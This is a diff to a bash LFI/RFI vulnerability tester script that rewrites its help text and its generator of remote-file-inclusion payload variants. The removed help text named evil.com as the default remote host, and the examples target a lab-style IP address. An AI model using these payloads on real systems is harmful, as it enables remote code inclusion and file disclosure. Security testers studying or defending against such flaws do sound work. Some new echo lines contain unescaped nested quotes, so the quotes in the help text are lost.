@@ -33,35 +33,33 @@ detail() { echo -e "${DIM}    $*${RESET}"; }
 sep()    { echo -e "${BOLD}$(printf '─%.0s' {1..65})${RESET}"; }
 
 usage() {
-    cat <<EOF
-${BOLD}lfi_rfi_tester.sh${RESET} — LFI / RFI vulnerability tester
-
-  ${CYAN}-u <url>${RESET}     Target URL with FUZZ placeholder.
-                 e.g. "http://target/page.php?file=FUZZ"
-  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ in URL)
-  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)
-  ${CYAN}-w <path>${RESET}    LFI wordlist path (default: auto-resolve LFI-Jhaddix.txt)
-  ${CYAN}-r <url>${RESET}     Remote URL for RFI payloads (default: http://evil.com/test.txt)
-  ${CYAN}-c <cookie>${RESET}  Cookie string, e.g. "PHPSESSID=abc123"
-  ${CYAN}-H <header>${RESET}  Extra header, e.g. "Authorization: Bearer token"
-  ${CYAN}-o <file>${RESET}    Save results to file
-  ${CYAN}-d <delay>${RESET}   Delay between requests in seconds (default: 0)
-  ${CYAN}-x${RESET}           Stop after first confirmed vulnerability
-  ${CYAN}-v${RESET}           Verbose: show all tested payloads
-  ${CYAN}-h${RESET}           This help
-
-${BOLD}Wordlist resolution order (LFI):${RESET}
-  1. -w <path> if supplied
-  2. SecLists install: /usr/share/seclists, /opt/SecLists, ~/SecLists, Homebrew
-  3. Cached /tmp/LFI-Jhaddix.txt from a previous run
-  4. Downloaded at runtime from raw.githubusercontent.com
-
-${BOLD}Examples:${RESET}
-  $0 -u "http://10.10.10.5/index.php?page=FUZZ"
-  $0 -u "http://10.10.10.5/index.php" -p page -t lfi -o results.txt
-  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -c "session=xyz" -x
-  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -w ~/wordlists/LFI-Jhaddix.txt
-EOF
+    echo -e "${BOLD}lfi_rfi_tester.sh${RESET} — LFI / RFI vulnerability tester"
+    echo -e ""
+    echo -e "  ${CYAN}-u <url>${RESET}     Target URL with FUZZ placeholder"
+    echo -e "               e.g. "http://target/page.php?file=FUZZ""
+    echo -e "  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ in URL)"
+    echo -e "  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)"
+    echo -e "  ${CYAN}-w <path>${RESET}    LFI wordlist path (default: auto-resolve LFI-Jhaddix.txt)"
+    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI payloads"
+    echo -e "  ${CYAN}-c <cookie>${RESET}  Cookie string e.g. "PHPSESSID=abc123""
+    echo -e "  ${CYAN}-H <header>${RESET}  Extra header e.g. "Authorization: Bearer token""
+    echo -e "  ${CYAN}-o <file>${RESET}    Save results to file"
+    echo -e "  ${CYAN}-d <delay>${RESET}   Delay between requests in seconds (default: 0)"
+    echo -e "  ${CYAN}-x${RESET}           Stop after first confirmed vulnerability"
+    echo -e "  ${CYAN}-v${RESET}           Verbose: show all tested payloads"
+    echo -e "  ${CYAN}-h${RESET}           This help"
+    echo -e ""
+    echo -e "${BOLD}Wordlist resolution order (LFI):${RESET}"
+    echo -e "  1. -w <path> if supplied"
+    echo -e "  2. SecLists install: /usr/share/seclists, /opt/SecLists, ~/SecLists, Homebrew"
+    echo -e "  3. Cached /tmp/LFI-Jhaddix.txt from a previous run"
+    echo -e "  4. Downloaded at runtime from raw.githubusercontent.com"
+    echo -e ""
+    echo -e "${BOLD}Examples:${RESET}"
+    echo -e "  $0 -u "http://10.10.10.5/index.php?page=FUZZ""
+    echo -e "  $0 -u "http://10.10.10.5/index.php" -p page -t lfi -o results.txt"
+    echo -e "  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -c "session=xyz" -x"
+    echo -e "  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -w ~/wordlists/LFI-Jhaddix.txt"
     exit 0
 }
 
@@ -127,18 +125,16 @@ lfi_payloads() {
 # ── RFI payloads ──────────────────────────────────────────────────────────────
 rfi_payloads() {
     local remote="$1"
-    cat <<PAYLOADS
-${remote}
-${remote}%00
-${remote}?
-${remote}#
-${remote}%23
-//${remote#http*://}
-\\\\${remote#http*://}
-${remote/http:/https:}
-http:${remote#*:}
-${remote}%3F
-PAYLOADS
+    echo -e "${remote}"
+    echo -e "${remote}%00"
+    echo -e "${remote}?"
+    echo -e "${remote}#"
+    echo -e "${remote}%23"
+    echo -e "//${remote#http*://}"
+    echo -e "\\\\\\\\${remote#http*://}"
+    echo -e "${remote/http:/https:}"
+    echo -e "http:${remote#*:}"
+    echo -e "${remote}%3F"
 }
 
 # ── Detection: LFI ───────────────────────────────────────────────────────────
